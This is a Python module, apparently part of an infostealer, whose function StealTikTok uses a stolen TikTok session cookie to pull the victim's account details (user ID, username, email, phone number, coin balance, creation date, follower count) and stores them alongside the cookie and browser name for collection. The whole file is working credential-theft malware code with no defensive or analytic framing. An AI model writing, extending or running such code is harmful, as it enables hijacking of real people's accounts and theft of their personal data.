import aiohttp # type: ignore
import time
from main import ListFonction, error_handler


async def StealTikTok(self, cookie: str, browser: str) -> None:
    try:
        headers = {"cookie": f"sessionid={cookie}", "Accept-Encoding": "identity"}
        url1 = 'https://www.tiktok.com/passport/web/account/info/'
        url2 = 'https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988'

        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
            data = await (await session.get(url1, headers=headers)).json()
            data2 = await (await session.get(url2, headers=headers)).json()

            user_id = data["data"]["user_id"]
            email = data["data"].get("email", "No Email")
            phone = data["data"].get("mobile", "No number")
            username = data["data"]["username"]
            coins = data2["data"]["coins"]
            timestamp = data["data"]["create_time"]
            uid = data["data"]["sec_user_id"]

            try:
                url3 = f'https://www.tiktok.com/api/user/list/?count=1&minCursor=0&scene=67&secUid={uid}'
                data3 = await (await session.get(url3, headers=headers)).json()
                subscriber = data3.get("total", "0")
            except Exception as e:
                error_handler(f"get tiktok subs error - {str(e)}")
                subscriber = "0"

            formatted_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))

    except Exception as e:
        error_handler(f"tiktok session error - {str(e)}")
        pass
    else:
        ListFonction.TikTokAccounts.append(f"User ID: {user_id}\nUsername: {username}\nEmail: {email}\nPhone: {phone}\nCoins: {coins}\nCreated At: {formatted_date}\nSubscribers: {subscriber}\nBrowser: {browser}\nCookie: {cookie}\n")
